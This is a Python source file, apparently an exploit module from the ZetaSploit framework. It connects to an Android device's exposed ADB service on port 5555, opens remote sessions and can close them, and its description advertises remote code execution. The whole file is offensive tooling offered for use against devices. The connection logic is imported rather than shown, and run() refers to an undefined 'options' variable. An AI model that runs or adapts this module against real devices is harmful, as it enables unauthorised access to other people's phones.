#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import sys

from core.badges import badges
from core.exceptions import exceptions
from core.storage import storage
from core.parser import parser

from data.modules.exploit.android.adb.reverse_tcp.core.server import server

class ZetaSploitModule:
    def __init__(self):
        self.badges = badges()
        self.exceptions = exceptions()
        self.storage = storage()
        self.parser = parser()
        
        self.server = server()

        self.id_number = 0
        self.sessions_id = dict()

        self.details = {
            'Name': "android/adb/reverse_tcp",
            'Authors': [
                'enty8080'
            ],
            'Description': "Access Android device over ADB service.",
            'Comment': [
                'RCE available if ADB enabled.'
            ]
        }

        self.options = {
            'RHOST': {
                'Description': "Remote host.",
                'Value': "",
                'Required': True
            }
        }

        self.commands = {
            'close': {
                'Description': "Close active session.",
                'Usage': "close <session_id>",
                'ArgsCount': 1,
                'NeedsArgs': True,
                'Args': [],
                'Run': self.close
            },
            'sessions': {
                'Description': "List all active sessions.",
                'Usage': "list",
                'ArgsCount': 0,
                'NeedsArgs': False,
                'Args': [],
                'Run': self.sessions
            }
        }

    def close(self):
        session_id = self.commands['close']['Args'][0]
        try:
            session = self.sessions_id[int(session_id)]
            session.disconnect()
            self.badges.output_process("Closing session " + str(session_id) + "...")
            del self.sessions_id[int(session_id)]
            self.storage.delete_element("post/android/adb", int(session_id))
        except:
            self.badges.output_error("Invalid session!")

    def sessions(self):
        if not self.sessions_id:
            self.badges.output_error("No active sessions!")
        else:
            for session in self.sessions_id.keys():
                self.badges.output_information(str(session))

    def run(self):
        remote_host = self.parser.parse_options(options)
        try:
            session = self.server.connect(remote_host, 5555)
            self.sessions_id[self.id_number] = session
            self.storage.set("post/android/adb", self.sessions_id)
            self.badges.output_success("Successfully connected!")
            self.badges.output_success("Opened session " + str(self.id_number) + "!")
            self.id_number += 1
        except self.exceptions.GlobalException:
            pass
